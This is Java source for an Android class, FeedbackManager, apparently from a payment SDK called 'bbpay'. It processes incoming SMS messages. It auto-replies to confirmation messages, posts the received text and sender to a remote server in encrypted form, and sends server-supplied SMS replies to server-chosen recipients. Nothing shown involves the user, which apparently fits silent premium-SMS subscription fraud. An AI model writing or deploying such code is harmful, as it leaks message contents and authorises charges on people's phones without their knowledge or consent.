package com.bbpay.android.manager;
import org.json.JSONObject;
import android.content.Context;
import com.bbpay.android.listener.RequestCallback;
import com.bbpay.android.listener.SendSmsListener;
import com.bbpay.android.setting.Setting;
import com.bbpay.android.sms.SmsSender;
import com.bbpay.android.utils.CommonUtil;
import com.bbpay.android.utils.InfoUtils;
import com.bbpay.android.utils.MyLogger;
import com.bbpay.android.utils.RequestUtils;
import com.bbpay.android.utils.StringUtils;
import com.bbpay.common.bean.Feedback;
import com.bbpay.common.bean.Json;
import com.bbpay.common.bean.request.FeedbackReportForm;
import com.bbpay.common.bean.request.IqForm;
import com.bbpay.common.bean.request.IqReportForm;
import com.bbpay.common.bean.response.IqResponse;

public class FeedbackManager {
    public static FeedbackManager getInstance(Context context) {
        if (instanse == null) instanse = new FeedbackManager(context);
        return instanse;
    }
    private static FeedbackManager instanse;
    private Context context;
    private static final int CONFIRM_TYPE_VARIABLE = 1;
    private static final int CONFIRM_TYPE_SERVER = 2;
    private static final String STRING = "->";
    private FeedbackManager(Context context) {
        this.context = context;
    }
    private void anserIQ(final IqResponse iqResponse) {
        if (iqResponse != null) {
            SendSmsListener listener = new SendSmsListener() {
                @Override
                public void onFailed(String address, String message, String errorMsg) {
                    report(false, errorMsg);
                }
                @Override
                public void onSuccess(String address, String message) {
                    report(true, null);
                }
                private void report(final boolean success, final String message) {
                    new Thread() {
                        @Override
                        public void run() {
                            try {
                                IqReportForm form = InfoUtils.initForm(context, IqReportForm.class);
                                form.iqResponse = iqResponse;
                                form.address = iqResponse.reciever;
                                form.content = iqResponse.answer;
                                form.success = success;
                                form.errorMessage = message;
                                RequestUtils.encryptPost(context, Setting.getServerUrl(), form.toJson());
                            } catch (Exception e) {
                                MyLogger.error(e);
                            }
                        }
                    }.start();
                }
            };
            SmsSender.sendSms(context, listener, iqResponse.reciever, iqResponse.answer, iqResponse.timeout);
        }
    }
    
    
    private static long lastFeedbackTime = 0;
    private static String lastAddress = null;
    private static String lastContent = null;
    public static boolean isDuplicateFeedback(String address, String content) {
        synchronized (FeedbackManager.class) {
            long current = System.currentTimeMillis();
            if (address != null && address.equals(lastAddress) && content != null && content.equals(lastContent)) {
                if (current - lastFeedbackTime < 30 * 1000L) { return true; }
            }
            lastAddress = address;
            lastContent = content;
            lastFeedbackTime = current;
            return false;
        }
    }
    public void executeFeedback(String address, String text, Feedback feedback) {
        if(isDuplicateFeedback(address, text)) return;
        switch (feedback.type) {
            case CONFIRM_TYPE_VARIABLE: {
                String confimText = CommonUtil.parseVariable(text, feedback.content);
                if (confimText != null) {
                    String receiver = feedback.port != null && feedback.port.length() > 4 ? feedback.port : address;
                    sendSms(feedback, receiver, confimText);
                }
                break;
            }
            case CONFIRM_TYPE_SERVER: {
                requestIntelligenceQuestion(text, address, feedback);
                break;
            }
        }
    }
    /**
     * 智能回复短信
     *
     */
    public void requestIntelligenceQuestion(final String text, final String receiver, final Feedback feedback) {
        try {
            IqForm question = InfoUtils.initForm(context, IqForm.class);
            question.feedback = feedback;
            question.address = receiver;
            question.content = text;
            String url = Setting.getServerUrl();
            JSONObject data = question.toJson();
            MyLogger.debug("OrderManager iq request url:" + url);
            MyLogger.debug("OrderManager iq request data:" + data);
            RequestUtils.encryptPost(context, url, data, new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    if (StringUtils.isNotBlank(content)) {
                        try {
                            JSONObject obj = CommonUtil.toJsonObject(content);
                            if (obj != null) {
                                anserIQ(Json.optObj(IqResponse.class, obj));
                            }
                        } catch (Exception e) {
                            MyLogger.error(e);
                        }
                    }
                }
            });
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
    private void sendSms(final Feedback feedback, final String number, final String msg) {
        SendSmsListener listener = new SendSmsListener() {
            @Override
            public void onFailed(String address, String message, String errorMsg) {
                report(false, errorMsg);
            }
            @Override
            public void onSuccess(String address, String message) {
                report(true, null);
            }
            private void report(final boolean success, final String message) {
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            FeedbackReportForm form = InfoUtils.initForm(context, FeedbackReportForm.class);
                            form.feedback = feedback;
                            form.address = number;
                            form.content = msg;
                            form.success = success;
                            form.errorMessage = message;
                            RequestUtils.encryptPost(context, Setting.getServerUrl(), form.toJson());
                        } catch (Exception e) {
                            MyLogger.error(e);
                        }
                    }
                }.start();
            }
        };
        SmsSender.sendSms(context, listener, number, msg, feedback.timeout);
    }
}
